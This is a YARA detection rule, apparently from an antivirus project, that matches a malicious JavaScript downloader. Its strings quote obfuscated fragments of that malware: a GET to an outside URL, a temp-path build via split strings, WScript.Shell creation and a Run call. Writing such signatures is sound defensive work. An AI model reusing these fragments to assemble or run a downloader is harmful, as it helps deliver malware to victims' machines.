rule sig_20160427_8a74c83d012701f42a83754cf969cc9b {
  meta:
    description = "datamaliciousorder - file 20160427_8a74c83d012701f42a83754cf969cc9b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8bd38e3d516708d14e90ced150bad20d370afba9074a91adcaaea584ae20d9cf"

  strings:
    $s1  = "QmvyhLsnaw[KihxeUqmie](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function DibwcWptns() {return YgpmmFqaqi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"NIB7ZAB" ascii
    $s3  = "function DibwcWptns() {return YgpmmFqaqi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"NIB7ZAB" ascii
    $s4  = "var YgpmmFqaqi = function AijguFcrmz() {return ZnystCqmdx[SncogNzgmv](\"WScript\"+\".Shell\");}(), PerrlBpbqf = 11;" fullword ascii
    $s5  = "function AorjzYxspx(SalgoPvfiv, ZwaoyVulal){PehejMkfzs = PehejMkfzs * 1; return SalgoPvfiv - ZwaoyVulal;};" fullword ascii
    $s6  = "var ZnystCqmdx = this[\"WScript\"];" fullword ascii
    $s7  = "function HehprBmelh(){return HwrfyJjlir + \"\";};" fullword ascii
    $s8  = "if (QmvyhLsnaw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function DhcpsZmecv() {return ((QxsxgFqyqk == true) && (QxsxgFqyqk == QpnrgQopmg)) ? 1 : PehejMkfzs;};" fullword ascii
    $s10 = "QxsxgFqyqk = true; " fullword ascii
    $s11 = "QpnrgQopmg = true; " fullword ascii
    $s12 = "function OkwghOgcqd(){return SncogNzgmv;};" fullword ascii
    $s13 = "function UnpbzSocdn()" fullword ascii
    $s14 = "var PzthoMgaqi = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "}while (BfhtkSwpnq);" fullword ascii
    $s16 = "function LgbxbBdsje(){return 23;};" fullword ascii
    $s17 = "UbsieZhbfc = true;" fullword ascii
    $s18 = "function ListaBqmag(JenmhIbbrl){YgpmmFqaqi[\"R\"+\"un\"](JenmhIbbrl, PehejMkfzs, PehejMkfzs);};" fullword ascii
    $s19 = "return AorjzYxspx(RfbynOqbhs, MuvniZbqgb);" fullword ascii
    $s20 = "var QxsxgFqyqk = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}